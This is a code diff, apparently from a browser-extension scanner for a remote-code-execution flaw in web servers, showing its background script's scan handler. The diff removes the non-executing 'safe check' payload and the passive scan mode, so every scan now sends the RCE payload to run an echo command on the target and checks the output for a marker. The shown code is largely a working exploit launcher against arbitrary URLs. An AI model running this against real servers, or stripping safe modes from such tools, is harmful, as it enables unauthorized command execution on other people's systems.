@@ -101,19 +101,6 @@ function buildRCEPayload(command) {
         `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;
 }
 
-// Build safe check payload (no RCE)
-function buildSafePayload() {
-    const body =
-        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
-        `Content-Disposition: form-data; name="1"\r\n\r\n` +
-        `{}\r\n` +
-        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
-        `Content-Disposition: form-data; name="0"\r\n\r\n` +
-        `["$1:aa:aa"]\r\n` +
-        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;
-    return body;
-}
-
 async function executeExploit(targetUrl, payload, timeout) {
     lastCapturedOutput = null;
 
@@ -183,37 +170,19 @@ browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
     }
 
     if (message.type === 'scan') {
-        const isActive = message.method === 'active';
+        // Always use active scan - execute echo command and check for marker
+        const command = 'echo VULN_MARKER_12345';
+        const payload = buildRCEPayload(command);
 
-        if (isActive) {
-            // Active scan: try to execute echo command and check for marker
-            const command = 'echo VULN_MARKER_12345';
-            const payload = buildRCEPayload(command);
-
-            executeExploit(message.url, payload, message.timeout || 10)
-                .then(result => {
-                    // Only mark as vulnerable if we see the actual marker in output
-                    const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
-                    result.vulnerable = vulnerable;
-                    result.scanCommand = command;
-                    sendResponse(result);
-                })
-                .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
-        } else {
-            // Passive scan: send safe payload and check for specific response patterns
-            const payload = buildSafePayload();
-
-            executeExploit(message.url, payload, message.timeout || 10)
-                .then(result => {
-                    // For passive, we look for signs the server processed our payload
-                    // Only mark vulnerable if we got a redirect header captured or specific error  
-                    const vulnerable = result.output !== null || (result.status === 500 && lastCapturedOutput !== null);
-                    result.vulnerable = vulnerable;
-                    result.scanCommand = 'safe-check (no exec)';
-                    sendResponse(result);
-                })
-                .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
-        }
+        executeExploit(message.url, payload, message.timeout || 10)
+            .then(result => {
+                // Only mark as vulnerable if we see the actual marker in output
+                const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
+                result.vulnerable = vulnerable;
+                result.scanCommand = command;
+                sendResponse(result);
+            })
+            .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
         return true;
     }
 
